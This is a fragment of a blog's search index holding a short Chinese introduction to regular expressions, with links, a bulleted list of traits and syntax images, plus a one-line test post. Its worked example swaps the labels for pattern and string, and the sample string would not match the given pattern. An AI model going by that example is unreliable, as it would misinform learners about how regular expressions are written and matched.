        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><p><em><a href="https://baike.baidu.com/item/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F" target="_blank" rel="noopener">不知道正则是什么的点这</a> </em> <em><a href="http://www.runoob.com/regexp/regexp-intro.html" target="_blank" rel="noopener">这里也可以</a></em></p><hr><p> <strong>举个例子</strong></p><ol><li><p><em>字符串： ^tel:[0-9]{1,3}-[0][0-9]{2,3}-[0-9]{8,11}$</em></p></li><li><p><em>原始正则： 086-0666-88810009999</em></p><p><em>正则表达式的特点是：</em></p><ul><li><p><em>灵活性、逻辑性和功能性非常强；</em></p></li><li><p><em>可以迅速地用极简单的方式达到字符串的复杂控制。</em></p></li><li><p>*<em>对于刚接触的人来说，比较晦涩难懂。</em></p></li></ul><p><em>由于正则表达式主要<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E5%AF%B9%E8%B1%A1" target="_blank" rel="noopener">应用对象</a>是文本，因此它在各种<a href="https://baike.baidu.com/item/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8" target="_blank" rel="noopener">文本编辑器</a>场合都有应用，小到著名编辑器EditPlus，大到Microsoft Word、Visual Studio等大型编辑器，都可以使用正则表达式来处理文本内容。</em></p></li></ol><hr><p><strong>正则表达式语法 ：</strong></p><hr><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/%E6%AD%A3%E5%88%9901.png" alt></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/%E6%AD%A3%E5%88%9902.png" alt></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/%E6%AD%A3%E5%88%9903.png" alt></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/%E6%AD%A3%E5%88%9904.png" alt></p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>测试哦！</title>
      <link href="/2019/03/21/%E6%B5%8B%E8%AF%95%E5%93%A6%EF%BC%81/"/>
      <url>/2019/03/21/%E6%B5%8B%E8%AF%95%E5%93%A6%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<hr><p>来啦！老弟</p><hr>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
